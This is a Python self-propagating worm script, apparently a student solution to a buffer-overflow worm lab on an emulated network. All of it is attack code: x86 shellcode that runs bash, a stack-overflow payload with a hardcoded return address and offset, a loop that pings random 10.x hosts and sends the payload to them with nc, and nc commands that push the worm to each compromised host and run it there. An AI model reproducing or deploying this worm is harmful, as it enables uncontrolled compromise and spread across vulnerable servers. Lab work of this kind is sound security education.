#!/bin/env python3
import sys
import os
import time
import subprocess
from random import randint

# You can use this shellcode to run any command you want
shellcode= (
   "\xeb\x2c\x59\x31\xc0\x88\x41\x19\x88\x41\x1c\x31\xd2\xb2\xd0\x88"
   "\x04\x11\x8d\x59\x10\x89\x19\x8d\x41\x1a\x89\x41\x04\x8d\x41\x1d"
   "\x89\x41\x08\x31\xc0\x89\x41\x0c\x31\xd2\xb0\x0b\xcd\x80\xe8\xcf"
   "\xff\xff\xff"
   "AAAABBBBCCCCDDDD" 
   "/bin/bash*"
   "-c*"
   # You can put your commands in the following three lines. 
   # Separating the commands using semicolons.
   # Make sure you don't change the length of each line. 
   # The * in the 3rd line will be replaced by a binary zero.
   " echo '(^_^) Shellcode is running (^_^)';                   "
   " nc -lnv 8080 > worm_psi.py; chmod +x                       " #as per the approach 2, we are adding the pilot code here
   " worm_psi.py; ./worm_psi.py;                               *"
   "123456789012345678901234567890123456789012345678901234567890"
   # The last line (above) serves as a ruler, it is not used
).encode('latin-1')


# Create the badfile (the malicious payload)
def createBadfile():
   content = bytearray(0x90 for i in range(500))
   ##################################################################
   # Put the shellcode at the end
   content[500-len(shellcode):] = shellcode

   ret    = 0xffffd588 + (500 - len(shellcode))  # here return address should be set to the buffer's address and the return address of 							     stack (from content variable)
   offset = 0x70 + 0x04  			   # As per the calculations we set the offset value to 70 by adding 4 bits of additional 							     space

   content[offset:offset + 4] = (ret).to_bytes(4,byteorder='little')
   ##################################################################

   # Save the binary code to file
   with open('badfile', 'wb') as f:
      f.write(content)

# Find the next victim (return an IP address).
# Check to make sure that the target is alive. 
def getNextTarget():
    while True:
        subnet = randint(151, 153) #here we are generating random value between 151-153 subnet value
        host = randint(71, 75) #here we are generating random value between 71-75 host value
        ipAddr = f"10.{subnet}.0.{host}"
        print("Now attacking.....")
        print(ipAddr)
        
        try:
            output = subprocess.check_output(f"ping -q -c1 -W1 {ipAddr}", shell=True)
            result = output.find(b'1 received')
            
            if result == -1:
                print(f"{ipAddr} is not alive", flush = True)
            else:
                print(f"*** {ipAddr} is alive, launch the attack", flush = True)
                return ipAddr
        except Exception as e:
            print(e)
#checking whether host has been already infected with worm or not             
def isInfectedAlready():
    exists = os.path.exists('badfile')
    if exists:
        return True
    else:
        return False


############################################################### 

print("The worm has arrived on this host ^_^", flush=True)

#From the above print statement we can understand that worm is arrived, so we call isInfectedAlready using if-condition here
if isInfectedAlready():
    print("The host is already infected so stopping propagation here...", flush = True)
    exit(0)

# This is for visualization. It sends an ICMP echo message to 
# a non-existing machine every 2 seconds.
subprocess.Popen(["ping -q -i2 1.2.3.4"], shell=True)

# Create the badfile 
createBadfile()

# Launch the attack on other servers
while True:
    targetIP = getNextTarget()

    # Send the malicious payload to the target host
    print(f"**********************************", flush=True)
    print(f">>>>> Attacking {targetIP} <<<<<", flush=True)
    print(f"**********************************", flush=True)
    subprocess.run([f"cat badfile | nc -w3 {targetIP} 9090"], shell=True)

    # Give the shellcode some time to run on the target host
    time.sleep(1)
    
    #adding the subprocess here with -w5 option as stated in server/client details, it was static earlier and fixed to single IP.
    #As we are attacking on multiple machines, we set the IP to dynamic variable as in line 71 using "targetIP"
    subprocess.run([f"nc -w5 {targetIP} 8080 < worm_psi.py"], shell=True) 

    # Sleep for 10 seconds before attacking another host
    time.sleep(10) 

    # Remove this line if you want to continue attacking others
    #exit(0)
